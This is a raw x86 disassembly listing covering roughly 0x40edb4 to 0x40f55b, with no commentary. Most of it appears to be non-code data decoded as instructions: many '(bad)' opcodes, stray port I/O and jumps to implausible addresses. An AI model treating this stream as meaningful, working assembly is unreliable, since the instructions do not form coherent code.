  40edb4:	hlt    
  40edb5:	add    eax,0xffd3e87d
  40edba:	cmp    bh,0x8
  40edbd:	(bad)  
  40edbe:	fld    DWORD PTR [esi]
  40edc0:	out    dx,al
  40edc1:	call   0xff9fecc9
  40edc6:	cmp    al,0x46
  40edc8:	shr    esp,0x8
  40edcb:	(bad)  
  40edcc:	pop    es
  40edcd:	fisttp QWORD PTR [ebp+0xe577eff]
  40edd3:	push   ebx
  40edd4:	add    BYTE PTR [ebx+0x24008b56],cl
  40edda:	add    BYTE PTR [ebp+0x50],al
  40eddd:	push   eax
  40edde:	add    DWORD PTR [ebx+0x757d1834],ecx
  40ede4:	sub    edx,DWORD PTR [esi-0x24]
  40ede7:	jne    0x40ed9f
  40ede9:	lods   eax,DWORD PTR ds:[esi]
  40edea:	mov    edx,DWORD PTR [edx-0x34]
  40eded:	dec    esi
  40edee:	out    0x83,eax
  40edf0:	into   
  40edf1:	push   edi
  40edf3:	loopne 0x40edc3
  40edf5:	shr    BYTE PTR [edx+ecx*4+0x0],1
  40edf9:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  40ee00:	rol    DWORD PTR [edx],0x8
  40ee03:	mov    esp,ecx
  40ee05:	cmp    DWORD PTR [ebx],0xc
  40ee08:	mov    esi,0x5001c0
  40ee0d:	push   eax
  40ee0e:	push   cs
  40ee0f:	push   eax
  40ee10:	(bad)  
  40ee11:	sub    edx,edi
  40ee13:	push   esi
  40ee14:	adc    al,0xcb
  40ee16:	ins    DWORD PTR es:[edi],dx
  40ee17:	mov    eax,0x203e8
  40ee1c:	add    al,ah
  40ee1e:	inc    esi
  40ee1f:	mov    al,ch
  40ee21:	pop    es
  40ee22:	add    DWORD PTR [eax],0x1
  40ee25:	add    dh,al
  40ee27:	add    ah,ch
  40ee29:	rol    DWORD PTR [edx-0xd],1
  40ee2c:	cli    
  40ee2d:	push   0x4a
  40ee2f:	pop    ecx
  40ee30:	retf   0xfe6
  40ee33:	add    BYTE PTR [ebx-0x4e72f41e],al
  40ee39:	(bad)  
  40ee3a:	dec    BYTE PTR [ebx+0x45b1fc72]
  40ee40:	(bad)  
  40ee41:	sub    ebp,DWORD PTR [ebx]
  40ee43:	and    al,0x52
  40ee45:	(bad)  
  40ee46:	dec    edi
  40ee47:	inc    ebp
  40ee48:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  40ee4f:	add    BYTE PTR [ebp-0x7b],dh
  40ee52:	pop    eax
  40ee53:	add    BYTE PTR [edx+0x0],bl
  40ee56:	pop    edx
  40ee57:	dec    ebp
  40ee58:	jmp    DWORD PTR [ebx]
  40ee5a:	and    al,0xec
  40ee5c:	push   edx
  40ee5d:	out    0x64,eax
  40ee5f:	jmp    0xd3f2e464
  40ee64:	jmp    0x40eebe
  40ee66:	mov    al,0xfe
  40ee68:	dec    BYTE PTR [ebp-0x18fd8018]
  40ee6e:	add    BYTE PTR [esi+ebp*1],bh
  40ee71:	pop    edx
  40ee72:	icebp  
  40ee73:	mov    eax,cs
  40ee75:	ins    BYTE PTR es:[edi],dx
  40ee76:	adc    eax,0x75510000
  40ee7b:	mov    esi,0x70158
  40ee80:	or     DWORD PTR [eax-0x74f48dfe],esi
  40ee86:	mov    edi,esp
  40ee88:	cld    
  40ee89:	jge    0x40ef00
  40ee8b:	(bad)  
  40ee8d:	aas    
  40ee8e:	and    al,0x6d
  40ee90:	adc    cl,0x1
  40ee93:	mov    eax,DWORD PTR [eax]
  40ee95:	and    ecx,DWORD PTR [ebx-0x167203fd]
  40ee9b:	dec    ebp
  40ee9c:	add    eax,ebp
  40ee9e:	add    BYTE PTR [edx],al
  40eea0:	fadd   DWORD PTR [eax]
  40eea2:	stc    
  40eea3:	enter  0xee00,0x8b
  40eea7:	sbb    eax,0x1
  40eeaa:	sbb    esi,ecx
  40eeac:	in     al,0x0
  40eeae:	in     eax,dx
  40eeaf:	add    BYTE PTR [eax],al
  40eeb1:	jne    0x40ee3e
  40eeb3:	cmp    edx,esp
  40eeb5:	jb     0x40eec0
  40eeb7:	jmp    0x40ef2e
  40eeb9:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  40eebf:	add    BYTE PTR [ebx+0x4d83d840],cl
  40eec5:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  40eecb:	jb     0x40ee56
  40eecd:	pop    edx
  40eece:	fadd   QWORD PTR [ebx-0x7445faa1]
  40eed4:	or     dh,BYTE PTR [edx+0x0]
  40eed7:	inc    edx
  40eed8:	or     dl,bh
  40eeda:	xlat   BYTE PTR ds:[ebx]
  40eedb:	dec    edx
  40eedc:	push   edi
  40eedd:	add    al,0x7
  40eedf:	leave  
  40eee0:	rol    DWORD PTR [edx+eax*1],0x7
  40eee4:	add    ecx,ecx
  40eee6:	mov    edx,ecx
  40eee8:	int3   
  40eee9:	jmp    0x40eea9
  40eeeb:	mov    al,0x0
  40eeed:	(bad)  
  40eeee:	jne    0x40eed8
  40eef0:	mov    eax,DWORD PTR [edx]
  40eef2:	call   0xc1556bf7
  40eef7:	pop    edi
  40eef8:	add    ebx,DWORD PTR [ecx-0x37]
  40eefb:	pop    ecx
  40eefc:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  40ef03:	push   es
  40ef04:	mov    eax,DWORD PTR [eax]
  40ef06:	int3   
  40ef07:	add    ch,al
  40ef09:	jae    0x40eef3
  40ef0b:	int    0x1
  40ef0d:	enter  0x3000,0x18
  40ef11:	add    BYTE PTR [ebp+0x75],al
  40ef14:	mov    esi,DWORD PTR [eax-0x171f0134]
  40ef1a:	push   0x2
  40ef1c:	pop    ecx
  40ef1d:	add    BYTE PTR [eax],cl
  40ef1f:	push   ebx
  40ef20:	lea    edi,[edi+eax*2]
  40ef23:	mov    al,0x1
  40ef25:	jb     0x40ef27
  40ef27:	mov    al,0x10
  40ef29:	push   eax
  40ef2a:	add    al,0x75
  40ef2c:	add    BYTE PTR [ebx],ch
  40ef2e:	add    ebx,esp
  40ef30:	int3   
  40ef31:	jne    0x40ef43
  40ef33:	movsx  edx,cl
  40ef36:	add    DWORD PTR [eax],eax
  40ef38:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  40ef3f:	mov    gs,edi
  40ef41:	add    BYTE PTR [eax-0x50],ch
  40ef44:	add    al,ch
  40ef46:	mov    eax,DWORD PTR [ecx]
  40ef48:	sub    eax,DWORD PTR [eax]
  40ef4a:	jb     0x40efc1
  40ef4c:	add    DWORD PTR [esp+eiz*8-0x50],esi
  40ef50:	jge    0x40ef3a
  40ef52:	add    al,0x1
  40ef54:	add    DWORD PTR [eax],0x0
  40ef57:	jne    0x40ef59
  40ef59:	je     0x40efa0
  40ef5b:	mov    eax,DWORD PTR [edi]
  40ef5d:	ror    BYTE PTR [ebp+0x4d],1
  40ef60:	or     DWORD PTR [ecx+0x4d03d004],0x3
  40ef67:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  40ef6d:	mov    DWORD PTR [ebx],ebp
  40ef6f:	fadd   DWORD PTR [eax+0x75]
  40ef72:	inc    eax
  40ef73:	pop    eax
  40ef74:	lea    ebx,[ecx+0x4f]
  40ef77:	push   0xb1000003
  40ef7c:	out    dx,eax
  40ef7d:	add    ebp,DWORD PTR [edx+edx*2]
  40ef80:	add    BYTE PTR [ebx+ecx*4],bh
  40ef83:	mov    ch,BYTE PTR [ebx]
  40ef85:	jb     0x40eff9
  40ef87:	add    al,0x89
  40ef89:	push   eax
  40ef8a:	call   0x84293cfc
  40ef8f:	add    DWORD PTR [eax+eax*1],eax
  40ef92:	jae    0x40efa8
  40ef94:	icebp  
  40ef95:	inc    ebp
  40ef96:	mov    eax,DWORD PTR gs:[ecx]
  40ef99:	int3   
  40ef9a:	out    dx,al
  40ef9b:	loopne 0x40efea
  40ef9d:	sub    eax,DWORD PTR [edx]
  40ef9f:	push   0xffffff83
  40efa1:	pop    esi
  40efa2:	push   cs
  40efa3:	jl     0x40efbe
  40efa5:	add    al,0xaf
  40efa7:	xor    eax,0x832b6d00
  40efac:	mov    eax,DWORD PTR [edx]
  40efae:	rcr    BYTE PTR [ebp+0x754500dc],cl
  40efb4:	ror    DWORD PTR [ebx+0x7dc8e803],1
  40efba:	inc    ebp
  40efbb:	shr    ebx,0x3
  40efbe:	or     DWORD PTR [eax],0x4
  40efc1:	push   0xffffffa5
  40efc3:	pop    esi
  40efc4:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  40efcb:	jmp    0x40f02a
  40efcd:	mov    edi,0xff0272
  40efd2:	fdivr  QWORD PTR [ebp+0x5d]
  40efd5:	push   0x4e
  40efd7:	pop    ecx
  40efd8:	call   0x4133dd
  40efdd:	mov    DWORD PTR [ebx],eax
  40efdf:	in     al,0xc8
  40efe1:	rol    BYTE PTR [ebp-0x75],0xc1
  40efe5:	call   0xaaf1c6
  40efea:	pop    esi
  40efeb:	enter  0xceff,0x8b
  40efef:	repz mov ecx,DWORD PTR [ebp-0x34]
  40eff3:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  40effa:	je     0x40effc
  40effc:	or     DWORD PTR [ebx-0x74183b24],eax
  40f002:	jne    0x40efe8
  40f004:	jmp    0x40efff
  40f006:	push   DWORD PTR [edx-0x24]
  40f009:	push   0x4d
  40f00b:	pop    ecx
  40f00c:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  40f010:	jge    0x40f018
  40f012:	mov    eax,eax
  40f014:	sub    ebp,DWORD PTR [edx+0x24]
  40f017:	pop    esi
  40f018:	inc    ebp
  40f019:	mov    esp,0x8b6077
  40f01e:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  40f024:	lods   al,BYTE PTR ds:[esi]
  40f025:	add    BYTE PTR [ebx],bh
  40f027:	enter  0xce73,0x49
  40f02b:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  40f033:	stc    
  40f034:	jge    0x40f0a8
  40f036:	jnp    0xdd407397
  40f03c:	call   0xc3f112
  40f041:	fadd   st(0),st
  40f043:	dec    esi
  40f044:	ins    BYTE PTR es:[edi],dx
  40f045:	stc    
  40f046:	cmp    al,0x73
  40f048:	push   ebp
  40f049:	mov    eax,0xf8028b
  40f04e:	jne    0x40f011
  40f050:	mov    esi,ecx
  40f052:	mov    esp,DWORD PTR [ebp+0x2c]
  40f055:	add    edi,DWORD PTR [ebp-0x24]
  40f058:	sub    esp,eax
  40f05a:	and    al,0x45
  40f05c:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  40f062:	sbb    al,0xee
  40f064:	pop    esi
  40f065:	call   0x80f095
  40f06a:	fsubr  st,st(3)
  40f06c:	sti    
  40f06d:	add    BYTE PTR gs:[ecx],bh
  40f070:	add    eax,esp
  40f072:	add    DWORD PTR [esi],eax
  40f074:	rol    DWORD PTR [ebp+0x8],0x29
  40f078:	mov    esp,eax
  40f07a:	clc    
  40f07b:	jne    0x40f0f2
  40f07d:	mov    eax,0x8b0673
  40f082:	loopne 0x40f0c9
  40f084:	loopne 0x40f00f
  40f086:	lods   al,BYTE PTR ds:[esi]
  40f087:	int3   
  40f088:	inc    ebp
  40f089:	mov    DWORD PTR gs:[eax+edi*8],eax
  40f08d:	add    al,0xc3
  40f08f:	sub    ecx,DWORD PTR [ebp+0x47]
  40f092:	(bad)  
  40f094:	shr    BYTE PTR [ebp-0x1f],0xe8
  40f098:	add    eax,DWORD PTR [eax]
  40f09a:	call   0x642b19f
  40f09f:	add    esi,DWORD PTR [esi-0x3b2efc83]
  40f0a5:	dec    esi
  40f0a6:	ins    DWORD PTR es:[edi],dx
  40f0a7:	in     al,dx
  40f0a8:	lea    eax,[eax]
  40f0aa:	inc    ebp
  40f0ab:	inc    ebp
  40f0ac:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  40f0b2:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  40f0bc:	and    al,0xdc
  40f0be:	ror    DWORD PTR [edx+0x24],0xf7
  40f0c2:	or     BYTE PTR [ebp+0x4c],dh
  40f0c5:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  40f0c9:	stos   BYTE PTR es:[edi],al
  40f0ca:	adc    edx,edi
  40f0cc:	inc    esp
  40f0cd:	add    edi,DWORD PTR [eax]
  40f0cf:	jne    0x40f0b4
  40f0d1:	mov    DWORD PTR [eax-0x7449db04],ecx
  40f0d7:	cmp    ecx,DWORD PTR [edi]
  40f0d9:	sub    BYTE PTR [ebp-0x7e],dl
  40f0dc:	sar    ebp,0xb
  40f0df:	jmp    FWORD PTR [edi+0x2400392a]
  40f0e5:	sub    esi,DWORD PTR [ebx-0x73]
  40f0e8:	mov    esp,DWORD PTR [ecx+edi*4]
  40f0eb:	mov    ecx,DWORD PTR [eax]
  40f0ed:	and    BYTE PTR [eax],al
  40f0ef:	jne    0x40f0bb
  40f0f1:	sub    ebp,ecx
  40f0f3:	sbb    BYTE PTR [esi+0x32],ah
  40f0f6:	dec    ebp
  40f0f7:	push   ebp
  40f0f8:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40f0fe:	ret    
  40f0ff:	mov    edx,ebp
  40f101:	leave  
  40f102:	sub    DWORD PTR [esi+0x24],ebx
  40f105:	ret    0x2b
  40f108:	pop    ax
  40f10a:	push   ebp
  40f10b:	rol    BYTE PTR [ebx],0xeb
  40f10e:	add    DWORD PTR [ecx+0x6c0001],0x40
  40f115:	jb     0x40f16c
  40f117:	ret    
  40f118:	in     al,dx
  40f119:	jecxz  0x40f0a6
  40f11b:	push   esi
  40f11c:	xchg   esp,eax
  40f11d:	jne    0x40f11f
  40f11f:	cmp    edx,DWORD PTR [esi+0x1c]
  40f122:	jne    0x40f108
  40f124:	mov    eax,DWORD PTR [ebp-0x77]
  40f127:	ror    DWORD PTR [ebx+0x899408],0xe0
  40f12e:	mov    esi,DWORD PTR [ebp-0x75]
  40f131:	pop    esi
  40f132:	nop
  40f133:	mov    eax,DWORD PTR [eax]
  40f135:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  40f13b:	add    al,0x0
  40f13d:	inc    ebp
  40f13e:	mov    eax,DWORD PTR [ebx]
  40f140:	mov    ebp,ebx
  40f142:	cmp    al,0xf
  40f144:	or     al,al
  40f146:	inc    ebp
  40f147:	inc    ebp
  40f148:	xor    eax,0x8bc89c8b
  40f14d:	ins    BYTE PTR es:[edi],dx
  40f14e:	cld    
  40f14f:	add    BYTE PTR [edi+0x566c16c0],dh
  40f155:	add    BYTE PTR [ecx-0x5],dl
  40f158:	add    eax,0x17200
  40f15d:	sbb    al,0x85
  40f15f:	dec    esp
  40f160:	je     0x40f19a
  40f162:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  40f166:	add    BYTE PTR [ebx],bh
  40f168:	(bad)  
  40f169:	and    al,0x32
  40f16b:	jae    0x40f109
  40f16d:	mov    cl,cl
  40f16f:	inc    DWORD PTR [esp]
  40f172:	push   ebp
  40f173:	shr    esp,0x8
  40f176:	in     al,dx
  40f177:	push   esp
  40f178:	add    DWORD PTR [eax],esp
  40f17a:	add    bl,cl
  40f17c:	inc    ebp
  40f17d:	mov    bh,0x53
  40f17f:	add    BYTE PTR [ebp-0x17],al
  40f182:	push   esi
  40f183:	cmovne ecx,edx
  40f186:	xor    cl,BYTE PTR [esp+ebx*4+0x20]
  40f18a:	push   edi
  40f18b:	pop    ss
  40f18c:	xor    eax,0x89009cd9
  40f191:	add    ah,bh
  40f193:	sub    eax,DWORD PTR [ebp-0x3f]
  40f196:	aad    0x5
  40f198:	inc    ebp
  40f199:	add    edx,edx
  40f19b:	add    BYTE PTR [ebp-0x40],al
  40f19e:	xlat   BYTE PTR ds:[ebx]
  40f19f:	ins    BYTE PTR es:[edi],dx
  40f1a0:	inc    ebp
  40f1a1:	inc    eax
  40f1a2:	and    ecx,eax
  40f1a4:	dec    eax
  40f1a5:	add    eax,0x20204c45
  40f1aa:	inc    ebp
  40f1ab:	fnstcw WORD PTR [esi+0x29]
  40f1ae:	leave  
  40f1af:	add    BYTE PTR [esi+0xc000c0],bh
  40f1b5:	lea    eax,[esp-0x34]
  40f1b9:	ret    
  40f1ba:	mov    dh,0x8b
  40f1bc:	xor    edx,DWORD PTR [ecx+0x3]
  40f1bf:	mov    al,BYTE PTR [ecx+0x1]
  40f1c2:	sbb    BYTE PTR [eax],al
  40f1c4:	stc    
  40f1c5:	mov    esi,DWORD PTR [edx+0x8]
  40f1c8:	(bad)  
  40f1c9:	les    esi,FWORD PTR ss:[ecx]
  40f1cc:	(bad)  
  40f1cd:	mov    al,ch
  40f1cf:	add    esi,eax
  40f1d1:	add    dh,al
  40f1d3:	or     esi,eax
  40f1d5:	mov    dl,0xc7
  40f1d7:	add    esi,eax
  40f1d9:	add    al,cl
  40f1db:	push   cs
  40f1dc:	mov    BYTE PTR [edx+0xc601c9],0xca
  40f1e3:	or     BYTE PTR [ebx],dh
  40f1e5:	dec    ecx
  40f1e6:	lea    eax,[ebx]
  40f1e8:	or     eax,0x18fc0fc7
  40f1ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1ee:	(bad)  
  40f1f0:	fiadd  WORD PTR [ebp-0x78]
  40f1f3:	jae    0xed75f942
  40f1f9:	or     BYTE PTR [ebp+0x7],al
  40f1fc:	loope  0x40f19b
  40f1fe:	inc    ebp
  40f1ff:	xor    dl,dh
  40f201:	pop    esi
  40f202:	inc    ebp
  40f203:	shr    edx,0xc
  40f206:	inc    ebp
  40f207:	and    ch,0x1
  40f20a:	inc    ebp
  40f20b:	add    bh,bl
  40f20d:	add    BYTE PTR [ebp-0x7b],al
  40f210:	out    dx,al
  40f211:	clc    
  40f212:	inc    ebp
  40f213:	ret    0xd7
  40f216:	inc    ebp
  40f217:	mov    edi,DWORD PTR [esi-0x7f]
  40f21a:	leave  
  40f21b:	sub    al,0x44
  40f21d:	add    BYTE PTR [ebx+ecx*4-0x76cce34a],bh
  40f224:	add    ebx,DWORD PTR [ecx+eax*2]
  40f227:	(bad)  
  40f228:	sbb    al,ah
  40f22a:	stc    
  40f22b:	test   DWORD PTR [edx-0x8],esi
  40f22e:	lea    edi,[edi-0x7007aa4]
  40f234:	mov    DWORD PTR [ebp-0x24],edi
  40f237:	(bad)  
  40f238:	dec    ebp
  40f239:	int3   
  40f23a:	mov    eax,0x71cdfcc6
  40f23f:	mov    BYTE PTR [ecx],0xce
  40f242:	(bad)  
  40f243:	(bad)  
  40f244:	dec    edi
  40f246:	jmp    FWORD PTR [edx-0x38]
  40f249:	(bad)  
  40f24a:	or     dl,al
  40f24c:	jge    0x40f214
  40f24e:	(bad)  
  40f24f:	shl    esp,1
  40f251:	xor    eax,DWORD PTR [ebp+0x45caf85a]
  40f257:	add    BYTE PTR [ebx+0xd8c8d],cl
  40f25d:	rdpmc  
  40f25f:	sbb    BYTE PTR [edi+0x7de08da],bh
  40f265:	mov    BYTE PTR [ebp+0x39063283],bl
  40f26b:	in     eax,dx
  40f26c:	cmovne ebx,DWORD PTR [edx]
  40f26f:	jecxz  0x40f271
  40f271:	inc    ebp
  40f272:	mov    esp,ecx
  40f274:	sbb    al,0x45
  40f276:	mov    ebx,edx
  40f278:	add    DWORD PTR [ebp+0x0],eax
  40f27b:	loopne 0x40f27e
  40f27d:	inc    ebp
  40f27e:	dec    ebp
  40f27f:	and    DWORD PTR [ebx+0x208045],ecx
  40f285:	inc    ebp
  40f286:	mov    DWORD PTR [esi+0x6a],edi
  40f289:	leave  
  40f28a:	mov    DWORD PTR [esp+edx*8-0x3c],0x33e5b6d6
  40f292:	inc    ebp
  40f293:	add    ebx,edi
  40f295:	inc    ecx
  40f296:	xlat   BYTE PTR ds:[ebx]
  40f297:	sbb    BYTE PTR [ebp-0x758d2b07],cl
  40f29d:	(bad)  
  40f29e:	xor    bh,BYTE PTR [eax+eax*4+0x8bd36c6]
  40f2a5:	(bad)  
  40f2a6:	dec    esi
  40f2a7:	mov    esi,0xbf45c6f3
  40f2ac:	mov    esi,eax
  40f2ae:	fadd   st,st(0)
  40f2b0:	inc    esi
  40f2b2:	(bad)  
  40f2b3:	rcl    esp,0xc6
  40f2b6:	inc    edx
  40f2b8:	push   eax
  40f2b9:	mov    BYTE PTR [ebp-0x3d],0x33
  40f2bd:	xor    eax,DWORD PTR [ebx]
  40f2bf:	lea    edx,[eax+0xd]
  40f2c2:	inc    ebp
  40f2c3:	jae    0x8c1b58e1
  40f2c9:	ficomp WORD PTR [eax+ecx*4]
  40f2cc:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  40f2d3:	test   esi,edi
  40f2d5:	(bad)  
  40f2d6:	(bad)  
  40f2d7:	inc    DWORD PTR [eax]
  40f2d9:	inc    ebp
  40f2da:	add    BYTE PTR [ebx-0x10aa23d0],cl
  40f2e0:	mov    edx,DWORD PTR [ebx]
  40f2e2:	cld    
  40f2e3:	mov    edi,ecx
  40f2e5:	mov    ecx,ebx
  40f2e7:	pop    esp
  40f2e8:	sar    edi,0x1e
  40f2eb:	cmp    ebp,esp
  40f2ed:	jne    0x40f362
  40f2ef:	mov    DWORD PTR ds:0x22450be4,ecx
  40f2f5:	loopne 0x40f2e3
  40f2f7:	pushf  
  40f2f8:	jae    0x40f285
  40f2fa:	add    eax,0x3388e91c
  40f2ff:	add    esp,ebp
  40f301:	add    BYTE PTR [ebx-0x40],dh
  40f304:	jmp    0x91f35f
  40f309:	mov    ebx,0x6a7275
  40f30e:	pop    ecx
  40f30f:	add    DWORD PTR [ebp+eax*4-0x77],esi
  40f313:	add    bh,BYTE PTR [eax+0x0]
  40f316:	dec    DWORD PTR [ebp+0x66]
  40f319:	mov    ecx,DWORD PTR [ebp-0xff0084]
  40f31f:	mov    DWORD PTR [edx-0x75],ebp
  40f322:	data16 sbb al,0x8d
  40f325:	mov    edi,edi
  40f327:	add    edi,edi
  40f329:	add    BYTE PTR [edx+0x1],ch
  40f32c:	data16 or BYTE PTR [ebp-0x1e00bb],cl
  40f333:	jmp    0xee6a:0xd84dc766
  40f33a:	pop    ecx
  40f33b:	jle    0x40f2c6
  40f33d:	inc    ebp
  40f33e:	sbb    BYTE PTR [esi-0x37],0x8
  40f342:	test   edx,ecx
  40f344:	(bad)  
  40f345:	jmp    0x41017c49
  40f34a:	push   ebp
  40f34b:	jne    0x40f3b3
  40f34d:	lea    ecx,[ebp-0x2c]
  40f350:	mov    DWORD PTR [ebp-0x200158],0xfe4585d6
  40f35a:	sar    bh,0xeb
  40f35d:	mov    eax,edi
  40f35f:	loopne 0x40f311
  40f361:	(bad)  
  40f362:	rol    ebx,cl
  40f364:	jmp    0xe9c0:0xdf1c458b
  40f36b:	push   eax
  40f36c:	inc    bp
  40f36e:	inc    ebp
  40f36f:	mov    eax,ebp
  40f371:	cwde   
  40f372:	mov    DWORD PTR [eax],0xd4ffc7d4
  40f378:	add    bh,bh
  40f37a:	add    BYTE PTR [ecx],al
  40f37c:	call   0x1400b81
  40f381:	inc    DWORD PTR [ebp-0xb201f8]
  40f387:	xor    eax,DWORD PTR [ebp-0xc401fd]
  40f38d:	jne    0x40f31a
  40f38f:	mov    eax,ds:0x33c70be0
  40f394:	ret    
  40f395:	out    dx,eax
  40f396:	mov    edx,DWORD PTR ds:0xbc0a31c
  40f39c:	push   eax
  40f39d:	xor    eax,DWORD PTR [ebp-0x71]
  40f3a0:	mov    esi,DWORD PTR [edx-0x68]
  40f3a3:	mov    ds:0x33ff0b00,eax
  40f3a8:	(bad)  
  40f3a9:	mov    ecx,0x8b8d0008
  40f3ae:	call   FWORD PTR [edi+edi*8]
  40f3b1:	and    bh,bh
  40f3b3:	push   0x66
  40f3b5:	mov    bp,0xff8d
  40f3b9:	(bad)  
  40f3ba:	(bad)  
  40f3bb:	dec    DWORD PTR [edi]
  40f3bd:	mov    DWORD PTR [edx],eax
  40f3bf:	jp     0x40f3c1
  40f3c1:	(bad)  
  40f3c2:	mov    ecx,0x774f59
  40f3c7:	mov    ecx,eax
  40f3c9:	jl     0x40f354
  40f3cb:	dec    DWORD PTR [eax-0x74c73fa7]
  40f3d1:	mov    DWORD PTR [esi+0x7e],esp
  40f3d4:	push   ebp
  40f3d5:	dec    DWORD PTR [ebp-0x7676f2a7]
  40f3db:	or     BYTE PTR [ebx+eiz*2+0x4d6666c2],0x55
  40f3e3:	xor    ecx,DWORD PTR [ebp-0x7627e877]
  40f3e9:	call   DWORD PTR [eax+0x668dc233]
  40f3ef:	test   al,0x55
  40f3f1:	mov    DWORD PTR [ebp-0x76bade7c],ecx
  40f3f7:	into   
  40f3f8:	xchg   esp,eax
  40f3f9:	loop   0x40f384
  40f3fb:	(bad)  
  40f3fc:	xchg   esi,eax
  40f3fd:	lods   al,BYTE PTR ds:[esi]
  40f3fe:	ret    0x8bd3
  40f401:	in     eax,dx
  40f402:	inc    bp
  40f404:	dec    ebp
  40f405:	in     al,0xb9
  40f407:	xor    BYTE PTR [edi-0x39],cl
  40f40a:	add    BYTE PTR [ecx+esi*8+0x64e189ec],dh
  40f411:	(bad)  
  40f412:	(bad)  
  40f413:	mov    eax,0x85667e8b
  40f418:	mov    ch,0xfe
  40f41a:	(bad)  
  40f41b:	(bad)  
  40f41c:	inc    DWORD PTR [eax]
  40f41e:	jno    0x40f420
  40f420:	data16 mov bl,0xb5
  40f423:	add    bh,bh
  40f425:	mov    edi,edi
  40f427:	fmul   QWORD PTR [ecx-0x729501]
  40f42d:	aam    0x8d
  40f42f:	call   edi
  40f431:	push   eax
  40f432:	mov    DWORD PTR [ebp+0x6c],eax
  40f435:	xor    edi,edi
  40f437:	add    eax,DWORD PTR [ebx-0x76bafcb0]
  40f43d:	sub    DWORD PTR [esi+0x44],0xffffffff
  40f441:	mov    ecx,DWORD PTR [ebp-0x767f1ee4]
  40f447:	add    DWORD PTR [eax+0x0],esi
  40f44a:	push   DWORD PTR [eax]
  40f44c:	push   bp
  40f44e:	lea    ecx,[ebp-0x8701]
  40f454:	mov    DWORD PTR [ecx+0x74],edx
  40f457:	sar    bh,1
  40f459:	or     DWORD PTR [ebx-0x48000386],0x77
  40f460:	fs test edi,edi
  40f463:	add    al,0x33
  40f465:	add    BYTE PTR [ebx],al
  40f467:	adc    dh,BYTE PTR [ebx]
  40f469:	add    BYTE PTR [esi-0x75],ah
  40f46c:	test   DWORD PTR [esi-0x1],esp
  40f46f:	inc    ebp
  40f470:	inc    DWORD PTR [ebx-0x2ff00abb]
  40f476:	dec    ebp
  40f477:	mov    DWORD PTR [ebx],esi
  40f479:	mov    al,BYTE PTR [ebx]
  40f47b:	push   ecx
  40f47c:	xor    esp,DWORD PTR [esi+0x66]
  40f47f:	push   ebp
  40f480:	inc    ebp
  40f481:	xor    DWORD PTR [ebx],0x8
  40f484:	mov    WORD PTR [ebp-0x72],ax
  40f488:	push   cx
  40f48a:	inc    ebp
  40f48b:	adc    WORD PTR [ebp-0x64],0xff83
  40f490:	mov    DWORD PTR [ebx],0x92b589f8
  40f496:	clc    
  40f497:	push   ecx
  40f498:	inc    ebp
  40f499:	data16 cmc 
  40f49b:	push   ebp
  40f49c:	pushf  
  40f49d:	data16 (bad) 
  40f49f:	dec    ebp
  40f4a0:	in     al,0x83
  40f4a2:	test   DWORD PTR [edi-0x76ba3508],eax
  40f4a8:	xor    ebx,DWORD PTR [eax+0xc7329c]
  40f4ae:	in     al,0x8b
  40f4b0:	add    eax,0x45b5f866
  40f4b5:	dec    DWORD PTR [ebx+0xf094ff]
  40f4bb:	mov    DWORD PTR [ecx+0x45fff466],ecx
  40f4c1:	lea    ecx,[ebx-0x4e76e3b3]
  40f4c7:	push   0x6600ff01
  40f4cc:	push   cs
  40f4cd:	test   DWORD PTR [eax+0xff01ff],eax
  40f4d3:	inc    ecx
  40f4d4:	inc    ebp
  40f4d5:	mov    WORD PTR [ebp-0x360018],ax
  40f4dc:	push   cs
  40f4dd:	shl    BYTE PTR [ebp+0x66],0x8b
  40f4e1:	test   DWORD PTR [edi+edi*8],ebx
  40f4e4:	cs (bad) 
  40f4e6:	inc    DWORD PTR [ecx-0x75]
  40f4e9:	data16 in al,dx
  40f4eb:	test   DWORD PTR [eax],ecx
  40f4ed:	inc    DWORD PTR [eax]
  40f4ef:	inc    DWORD PTR [ecx-0x77]
  40f4f2:	mov    esi,DWORD PTR [edx-0x77]
  40f4f5:	call   FWORD PTR [eax]
  40f4f7:	leavew 
  40f4f9:	xchg   ebp,eax
  40f4fa:	inc    edi
  40f4fb:	push   DWORD PTR [ebp-0x1]
  40f4fe:	call   0xff50e048
  40f503:	lea    eax,[ebp-0x1]
  40f506:	mov    edi,edi
  40f508:	enter  0xc7,0xc3
  40f50c:	mov    eax,ecx
  40f50e:	xor    ecx,DWORD PTR [ecx-0x749bfd]
  40f514:	sbb    al,0x8b
  40f516:	sbb    esp,edi
  40f518:	dec    ebp
  40f519:	mov    bh,0x8b
  40f51b:	mov    ah,cl
  40f51d:	mov    DWORD PTR [eax],0x8bc1ffc3
  40f523:	mov    eax,ebx
  40f525:	mov    BYTE PTR [eax],al
  40f527:	sar    bh,0x89
  40f52a:	sub    BYTE PTR [eax-0x77ff766c],cl
  40f530:	mov    esp,DWORD PTR [ebp+0x7c]
  40f533:	add    BYTE PTR [eax],al
  40f535:	inc    ebp
  40f536:	mov    esi,DWORD PTR ds:0xc7049c8d
  40f53c:	or     ah,bl
  40f53e:	add    BYTE PTR [ebp+0x458bf800],0x85
  40f545:	xor    DWORD PTR [edi],ecx
  40f547:	pushf  
  40f548:	js     0x40f511
  40f54a:	add    al,dh
  40f54c:	mov    eax,DWORD PTR [ebp+0x4509f8f4]
  40f552:	inc    eax
  40f553:	xor    eax,0x8b209f89
  40f558:	call   FWORD PTR [ebx+ecx*4]
  40f55b:	cmp    al,0x1
